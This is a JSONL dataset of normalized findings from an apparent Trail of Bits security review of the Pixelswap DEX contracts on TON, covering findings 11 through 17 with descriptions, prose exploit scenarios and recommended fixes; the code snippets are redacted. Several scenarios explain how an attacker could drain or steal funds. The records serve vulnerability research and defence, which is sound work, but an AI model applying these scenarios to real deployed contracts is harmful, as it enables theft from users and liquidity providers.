"fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-10", "Target": "contracts/univ2_math.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-011", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 11, "page_start": 34, "title": "Users can use nested PlaceOrders to drain the settlement contract", "short_summary": null, "description_md": "#### Description\n\nThe spend\\_order\\_inputs function of the PixelswapFundingWallet contract does not spend the input tokens of the nested PlaceOrder messages, which allows users to use nested PlaceOrder messages to drain all the assets from the settlement contract.\n\nThe PlaceOrder receiver function of the PixelswapFundingWallet contract calls the spend\\_order\\_inputs internal function to update the user's balance of tokens for the order. The PlaceOrder message has an optional ref\\_po field, which can have a ref to another PlaceOrder message. The spend\\_order\\_inputs function processes these nested PlaceOrder messages by recursively calling the spend\\_order\\_inputs function:\n\n#### **[Redacted]**\n\nHowever, the return statement of the spend\\_order\\_inputs function compiles to the following FunC code:\n\n#### **[Redacted]**\n\nThe above FunC code returns the first FunC tensor, which is computed by processing the input tokens specified in the outermost PlaceOrder instead of returning the result of the recursive call of the \\$PixelswapFundingWallet\\$\\_fun\\_spend\\_order\\_inputs FunC function. The value returned from this function is then stored in the contract storage.\n", "full_markdown": "### 11. Users can use nested PlaceOrders to drain the settlement contract\n\n| Severity: High                           | Diffi culty: Low       |\n|---------------------------------------------|------------------------------|\n| Type: Data Validation                 | Finding ID: TOB-PXL-11 |\n| Target: contracts/pixelswap_funding.tact |                              |\n\n#### Description\n\nThe spend\\_order\\_inputs function of the PixelswapFundingWallet contract does not spend the input tokens of the nested PlaceOrder messages, which allows users to use nested PlaceOrder messages to drain all the assets from the settlement contract.\n\nThe PlaceOrder receiver function of the PixelswapFundingWallet contract calls the spend\\_order\\_inputs internal function to update the user's balance of tokens for the order. The PlaceOrder message has an optional ref\\_po field, which can have a ref to another PlaceOrder message. The spend\\_order\\_inputs function processes these nested PlaceOrder messages by recursively calling the spend\\_order\\_inputs function:\n\n#### **[Redacted]**\n\nHowever, the return statement of the spend\\_order\\_inputs function compiles to the following FunC code:\n\n#### **[Redacted]**\n\nThe above FunC code returns the first FunC tensor, which is computed by processing the input tokens specified in the outermost PlaceOrder instead of returning the result of the recursive call of the \\$PixelswapFundingWallet\\$\\_fun\\_spend\\_order\\_inputs FunC function. The value returned from this function is then stored in the contract storage.\n\n#### Exploit Scenario\n\nEve deposits 1000,000,000 nanotons TON and 1000,000,000 nanotons USDC in her funding wallet. Eve then sends a PlaceOrder message to add liquidity of 1000,000,000 nanotons TON and 1000,000,000 nanotons USDC to the TON/USDC pool, with the ref\\_po having another PlaceOrder order message to add the same liquidity again. The spend\\_order\\_inputs function of the funding wallet contract deducts Eve's balance for only the outermost PlaceOrder message, stores the new values of 0 TON and 0 USDC balance in the contract storage, and sends the whole PlaceOrder message to the funding master contract. The whole PlaceOrder is then successfully processed by the PixelswapStreamPool contract to mint LP token amounts for both PlaceOrder\n\n\n\nmessages for Eve. Eve then redeems all her LP tokens from the pool and withdraws 2000,000,000 nanotons TON and 2000,000,000 nanotons USDC.\n\n#### Recommendations\n\nShort term, replace the return statement of the recursive call with the following:\n\n#### **[Redacted]**\n\nLong term, expand the test suite to check execution of nested orders. Check the whole system state after a transaction in a test case to ensure correctness of the test cases.\n\n#### **Fix Review Status**\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-11", "target": {"path": "contracts/pixelswap_funding.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_funding.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-11", "Target": "contracts/pixelswap_funding.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-012", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 12, "page_start": 36, "title": "The LP tokens are never burned by the Stream Pool contract", "short_summary": null, "description_md": "#### Description\n\nThe PixelswapStreamPool contract sends the burn message to the Jetton master contract of the pair's LP token instead of the Jetton wallet owned by itself. This results in the LP tokens never being burned.\n\nUsers remove their liquidity by transferring their LP tokens to the PixelswapStreamPool contract with a payload to send the RemoveLiquidityJettonNotification message to the PixelswapStreamPool contract. The RemoveLiquidityJettonNotification handler function of the Stream Pool contract updates the reserves and LP token supply stored in the pair\\_config map and calls the self.burn function. The burn function is inherited from the JettonFactory trait contract:\n\n#### **[Redacted]**\n\nThe burn function of the JettonFactory trait sends the burn message to the Jetton master contract of the LP token with the bounce flag set to false. The Jetton master contract reverts the transaction, and the burn message is never processed by the Jetton contracts of the LP token.\n", "full_markdown": "# 12. The LP tokens are never burned by the Stream Pool contract\n\n| Severity: High | Diffi culty: Low |\n|-------------------|------------------------|\n| Type:             | Finding                |\n| Data              | ID:                    |\n| Validation        | TOB-PXL-12             |\n\nTarget: contracts/jetton/jetton\\_factory.tact\n\n#### Description\n\nThe PixelswapStreamPool contract sends the burn message to the Jetton master contract of the pair's LP token instead of the Jetton wallet owned by itself. This results in the LP tokens never being burned.\n\nUsers remove their liquidity by transferring their LP tokens to the PixelswapStreamPool contract with a payload to send the RemoveLiquidityJettonNotification message to the PixelswapStreamPool contract. The RemoveLiquidityJettonNotification handler function of the Stream Pool contract updates the reserves and LP token supply stored in the pair\\_config map and calls the self.burn function. The burn function is inherited from the JettonFactory trait contract:\n\n#### **[Redacted]**\n\nThe burn function of the JettonFactory trait sends the burn message to the Jetton master contract of the LP token with the bounce flag set to false. The Jetton master contract reverts the transaction, and the burn message is never processed by the Jetton contracts of the LP token.\n\n#### Exploit Scenario\n\nAlice adds 1000,000,000 nanotons TON and 1000,000,000 nanotons USDC to the pool and mints 1000,000,000 nanotons LP tokens. After some time, Alice removes her liquidity by transferring her LP tokens to the PixelswapStreamPool contract, but the LP tokens are not burned by the Stream Pool contract, and the LP token balance of the Stream Pool contract is increased by 1,000,000,000 nanotons LP tokens.\n\n#### Recommendations\n\nShort term, update the burn function of the JettonFactory trait contract to send the burn message to the Jetton wallet owned by the Stream Pool contract.\n\nLong term, check the whole system state after a transaction in a test case to ensure correctness of the test cases.\n\n\n\n#### **Fix Review Status**\n", "severity": null, "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-013", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 13, "page_start": 38, "title": "Lack of the pair\\_id and token\\_id validation in the PixelswapStreamPool contract", "short_summary": null, "description_md": "#### Description\n\nThe PlaceOrder message receiver function of the PixelswapStreamPool contract does not validate that the pair\\_id specified in the message corresponds to the token\\_id values specified in the message. This allows users to provide arbitrary token\\_id values to execute a swap or add liquidity to a pair without transferring the required tokens.\n\nThe protocol allows users to transfer their Jettons and execute a protocol action in a single transaction by specifying order parameters in the forward\\_payload field of the transfer message of the Jetton contract. The Jetton contract sends the OrderJettonNotification message to the settlement contract, which adds a deposit to the user's funding wallet, executes a swap, or adds liquidity to the specified pair based on the forward\\_payload value specified in the OrderJettonNotification message.\n\nHowever, the OrderJettonNotification message receiver cannot verify that the message is sent by the correct Jetton wallet contract and is not sent by a malicious actor; it considers the sender as the token\\_id for the order to be executed. This allows users to add a funding wallet balance for an arbitrary token\\_id, execute a swap without transferring Jettons, and add liquidity to a pool without transferring Jettons by sending the OrderJettonNotification message from an arbitrary address.\n\n#### **[Redacted]**\n\nAs a result, the PlaceOrder message receiver function of the PixelswapStreamPool contract does not check if the user-provided value of the pair\\_id field corresponds to the token\\_id values provided in the PlaceOrder message. This allows attackers to send the OrderJettonNotification message from an arbitrary address to steal tokens from the settlement contract.\n", "full_markdown": "# 13. Lack of the pair\\_id and token\\_id validation in the PixelswapStreamPool contract\n\n| Severity: High                              | Diffi culty: Low       |\n|------------------------------------------------|------------------------------|\n| Type: Data Validation                    | Finding ID: TOB-PXL-13 |\n| Target: contracts/pixelswap_streampool.tact |                              |\n\n#### Description\n\nThe PlaceOrder message receiver function of the PixelswapStreamPool contract does not validate that the pair\\_id specified in the message corresponds to the token\\_id values specified in the message. This allows users to provide arbitrary token\\_id values to execute a swap or add liquidity to a pair without transferring the required tokens.\n\nThe protocol allows users to transfer their Jettons and execute a protocol action in a single transaction by specifying order parameters in the forward\\_payload field of the transfer message of the Jetton contract. The Jetton contract sends the OrderJettonNotification message to the settlement contract, which adds a deposit to the user's funding wallet, executes a swap, or adds liquidity to the specified pair based on the forward\\_payload value specified in the OrderJettonNotification message.\n\nHowever, the OrderJettonNotification message receiver cannot verify that the message is sent by the correct Jetton wallet contract and is not sent by a malicious actor; it considers the sender as the token\\_id for the order to be executed. This allows users to add a funding wallet balance for an arbitrary token\\_id, execute a swap without transferring Jettons, and add liquidity to a pool without transferring Jettons by sending the OrderJettonNotification message from an arbitrary address.\n\n#### **[Redacted]**\n\nAs a result, the PlaceOrder message receiver function of the PixelswapStreamPool contract does not check if the user-provided value of the pair\\_id field corresponds to the token\\_id values provided in the PlaceOrder message. This allows attackers to send the OrderJettonNotification message from an arbitrary address to steal tokens from the settlement contract.\n\n#### Exploit Scenario 1\n\nEve sends an OrderJettonNotification message from her smart wallet to swap USDC for TON from the TON/USDC pool. The order is executed successfully, and Eve gets free TON from the settlement contract.\n\n\n\n#### Exploit Scenario 2\n\nEve sends an OrderJettonNotification message from her smart wallet to deposit a fake Jetton to her funding wallet. She then sends a PlaceOrder message to swap USDC for TON by specifying the fake Jetton as input token token\\_id and TON/USDC pair pair\\_id. The order is executed successfully, and Eve gets free TON from the settlement contract.\n\n#### Recommendations\n\nShort term, validate that the pair\\_id specified in the PlaceOrder message corresponds to the provided token\\_id values to ensure correct token transfers before executing an order.\n\nLong term, validate all user inputs at all of the system's entrypoints to ensure the correctness and security of the system.\n\n#### **Fix Review Status**\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-13", "target": {"path": "contracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-13", "Target": "contracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-014", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 14, "page_start": 40, "title": "The value attached to messages is not checked to be positive", "short_summary": null, "description_md": "#### Description\n\nThe message tools library implements helper functions to deal with message passing between contracts. Some of these functions deal with messages that carry TON value, and the caller can specify the amount of TON to send.\n\nIn two of these functions, there is no check to ensure that the value to be set is positive. Given that the parameter is of type Int, it is possible to pass a negative value and break functionality.\n\nThe vulnerable functions are send\\_to\\_value and send\\_and\\_deploy\\_value, shown in figures 14.1 and 14.2:\n\n#### **[Redacted]**\n\nThe following list shows examples of potentially dangerous usages of this function in the current codebase:\n\n- [OrderJettonNotification](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L419-L419) handler in pixelswap\\_settlement.tact\n- [RemoveLiquidityJettonNotification](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_streampool.tact#L298-L298) handler in pixelswap\\_streampool.tact\n- Swap [handler](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L483-L483) in pixelswap\\_settlement.tact\n- [OrderExecutionResult](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L605-L605) handler in pixelswap\\_settlement.tact\n- [InternalTransfer](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L626-L626) handler in pixelswap\\_settlement.tact\n- [Deposit](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L762-L762) function in pixelswap\\_settlement.tact\n\nMost of these usages depend on the current values for the gas configuration, lack of check or enforcement of context().value that could be bypassed by future implementations, or values that depend on the execution state (reliance on gas\\_consumed()).\n", "full_markdown": "| 14. The value attached to messages is not checked to be positive |                              |\n|------------------------------------------------------------------------------------------------|------------------------------|\n| Severity: Informational                                                                     | Diffi culty: High      |\n| Type: Data Validation                                                                    | Finding ID: TOB-PXL-14 |\n| Target: contracts/utils/msgtools.tact                                                       |                              |\n\n#### Description\n\nThe message tools library implements helper functions to deal with message passing between contracts. Some of these functions deal with messages that carry TON value, and the caller can specify the amount of TON to send.\n\nIn two of these functions, there is no check to ensure that the value to be set is positive. Given that the parameter is of type Int, it is possible to pass a negative value and break functionality.\n\nThe vulnerable functions are send\\_to\\_value and send\\_and\\_deploy\\_value, shown in figures 14.1 and 14.2:\n\n#### **[Redacted]**\n\nThe following list shows examples of potentially dangerous usages of this function in the current codebase:\n\n- [OrderJettonNotification](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L419-L419) handler in pixelswap\\_settlement.tact\n- [RemoveLiquidityJettonNotification](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_streampool.tact#L298-L298) handler in pixelswap\\_streampool.tact\n- Swap [handler](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L483-L483) in pixelswap\\_settlement.tact\n- [OrderExecutionResult](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L605-L605) handler in pixelswap\\_settlement.tact\n- [InternalTransfer](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L626-L626) handler in pixelswap\\_settlement.tact\n- [Deposit](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L762-L762) function in pixelswap\\_settlement.tact\n\nMost of these usages depend on the current values for the gas configuration, lack of check or enforcement of context().value that could be bypassed by future implementations, or values that depend on the execution state (reliance on gas\\_consumed()).\n\n#### Recommendations\n\nShort term, add a validation for the value parameter to be positive in the send\\_to\\_value and send\\_and\\_deploy\\_value functions.\n\n\n\nLong term, check all usages of these functions in the codebase and ensure that all calculations for the value parameters are well-defined, bounded, and never negative. Enforce these checks by creating new test cases.\n\n#### **Fix Review Status**\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-PXL-14", "target": {"path": "contracts/utils/msgtools.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/utils/msgtools.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-PXL-14", "Target": "contracts/utils/msgtools.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-015", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 15, "page_start": 42, "title": "The current balance is not checked before sending a message with a non-zero value", "short_summary": null, "description_md": "#### Description\n\nAll message sending functions in the message tools library use the SendIgnoreErrors mode. If the sender contract's current TON balance is insufficient to send the specified value, the message will not be sent and will be dropped silently in the action phase. Consequently, funds can be lost, or the system state can become out of sync between contracts.\n\nThis issue can be exploited in different ways, one of which is described in the Exploit Scenario section below.\n", "full_markdown": "# 15. The current balance is not checked before sending a message with a non-zero value\n\n| Severity: High                        | Diffi culty: Medium    |\n|------------------------------------------|------------------------------|\n| Type: Data Validation              | Finding ID: TOB-PXL-15 |\n| Target: contracts/utils/msgtools.tact |                              |\n\n#### Description\n\nAll message sending functions in the message tools library use the SendIgnoreErrors mode. If the sender contract's current TON balance is insufficient to send the specified value, the message will not be sent and will be dropped silently in the action phase. Consequently, funds can be lost, or the system state can become out of sync between contracts.\n\nThis issue can be exploited in different ways, one of which is described in the Exploit Scenario section below.\n\n#### Exploit Scenario\n\nIn the settlement contract, when the token\\_id is the TON native asset, the [send\\\\_tokens](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L728-L746) [function](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L728-L746) sends a token amount equal to the sum of the specified token\\_amt, the forwarding gas, and the gas cost to pay for the transfer. However, it never checks that the contract's current balance exceeds the value to be sent.\n\nThis results in a loss of funds for the user, because the funding wallet's TON balance has already been reduced at this point.\n\n#### Recommendations\n\nShort term, when dealing with TON amounts to be transferred in messages, first ensure that the current contract's balance is enough. In case of failure, notify the sender via AFR.\n\nLong term, document all gas usages in the different message flows; ensure that the contract balances cannot drop below a certain threshold; and implement tests that check that the functionality of the system is not broken in low-balance situations.\n\n### **Fix Review Status**\n", "severity": "High", "difficulty": "Medium", "type": "Data Validation", "finding_id": "TOB-PXL-15", "target": {"path": "contracts/utils/msgtools.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/utils/msgtools.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Medium", "Type": "Data Validation", "Finding ID": "TOB-PXL-15", "Target": "contracts/utils/msgtools.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-016", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 16, "page_start": 43, "title": "The exec\\_id value is not validated for the internal orders in nested PlaceOrder messages", "short_summary": null, "description_md": "#### Description\n\nWhen a PlaceOrder message arrives at the PixelswapStreamPool contract, the exec\\_id is checked to ensure it matches the current contract's exec\\_id. This is also checked in the settlement contract to ensure that the message is routed to the correct PixelswapStreamPool:\n\n#### **[Redacted]**\n\nHowever, PlaceOrder messages can have nested PlaceOrder messages in the ref\\_po field, and those nested exec\\_ids are never checked by the settlement or Stream Pool contracts.\n\nAdditionally, when the order is processed by process\\_order(), a ProcessOrderResult message is generated with the exec\\_id of the current Stream Pool, no matter what the original message's exec\\_id was. This result is sent back to the settlement contract to keep track of the accounting, and the process\\_order\\_execution function updates the settlement vault balances using the exec\\_id set by the Stream Pool.\n\n#### **[Redacted]**\n", "full_markdown": "# 16. The exec\\_id value is not validated for the internal orders in nested PlaceOrder messages\n\n| Severity: Medium                                                                    | Diffi culty: Low       |\n|----------------------------------------------------------------------------------------|------------------------------|\n| Type: Data Validation                                                            | Finding ID: TOB-PXL-16 |\n| Target: contracts/pixelswap_streampool.tact, contracts/pixelswap_settlement.tact |                              |\n\n#### Description\n\nWhen a PlaceOrder message arrives at the PixelswapStreamPool contract, the exec\\_id is checked to ensure it matches the current contract's exec\\_id. This is also checked in the settlement contract to ensure that the message is routed to the correct PixelswapStreamPool:\n\n#### **[Redacted]**\n\nHowever, PlaceOrder messages can have nested PlaceOrder messages in the ref\\_po field, and those nested exec\\_ids are never checked by the settlement or Stream Pool contracts.\n\nAdditionally, when the order is processed by process\\_order(), a ProcessOrderResult message is generated with the exec\\_id of the current Stream Pool, no matter what the original message's exec\\_id was. This result is sent back to the settlement contract to keep track of the accounting, and the process\\_order\\_execution function updates the settlement vault balances using the exec\\_id set by the Stream Pool.\n\n#### **[Redacted]**\n\n#### Exploit Scenario\n\nBob, a PixelSwap user, creates an order composed of a TON/USDC swap and a deposit to a USDC/USDT pool located in a different Stream Pool contract. In order to save some time, he nests both orders in a single PlaceOrder message, believing that the system will correctly identify the execution contracts that must be called. The order executes successfully and the resulting reserves of the TON/USDC pair will be incorrect since both orders were processed by the TON/USDC pool execution contract.\n\n#### Recommendations\n\nShort term, check that the exec\\_id value matches the current execution contract's ID for all orders in a nested PlaceOrder message. Notify the user in case an invalid order is not processed so they can retry later or at least be aware of the execution failure.\n\n\n\nLong term, consider re-engineering the architecture and the way nested orders are created, transmitted, and handled. Alternatively, consider rewriting the PlaceOrder nesting feature in order to make it less error-prone (e.g.,, by nesting only the non-redundant information).\n\n#### **Fix Review Status**\n", "severity": "Medium", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-16", "target": {"path": "contracts/pixelswap_streampool.tact, contracts/pixelswap_settlement.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool.tact, contracts/pixelswap_settlement.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-16", "Target": "contracts/pixelswap_streampool.tact, contracts/pixelswap_settlement.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-017", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 17, "page_start": 45, "title": "The token_balance get function reverts if a user balance is 0", "short_summary": null, "description_md": "#### Description\n\nThe token\\_balance function in the PixelswapFundingWallet contract should return the current wallet's balance for the specified token. However, the balances mapping entry is deleted when the user balance becomes zero, so the token\\_balance function reverts when it is called for users with zero balance.\n\nThis can affect external off-chain integrations, potentially breaking external projects that are attempting to get information from Pixelswap.\n\n### **[Redacted]**\n", "full_markdown": "| 17. The token_balance get function reverts if a user balance is 0 |                              |\n|----------------------------------------------------------------------------------------------------|------------------------------|\n| Severity: Undetermined                                                                          | Diffi culty: Low       |\n| Type: Data Validation                                                                        | Finding ID: TOB-PXL-17 |\n|                                                                                                    |                              |\n\nTarget: contracts/pixelswap\\_funding.tact\n\n#### Description\n\nThe token\\_balance function in the PixelswapFundingWallet contract should return the current wallet's balance for the specified token. However, the balances mapping entry is deleted when the user balance becomes zero, so the token\\_balance function reverts when it is called for users with zero balance.\n\nThis can affect external off-chain integrations, potentially breaking external projects that are attempting to get information from Pixelswap.\n\n### **[Redacted]**\n\n#### Recommendations\n\nShort term, return the expected value of zero if the mapping entry does not exist.\n\nLong term, consider rewriting the parts of the code where the mapping entry is deleted for zero balance results. Since test cases can also break when this call reverts, it is recommended that the test suite be improved to detect this kind of unexpected behavior.\n\n### **Fix Review Status**\n", "severity": "Undetermined", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-17", "target": {"path": "contracts/pixelswap_funding.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_funding.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Undetermined", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-17", "Target": "contracts/pixelswap_funding.tact"}}
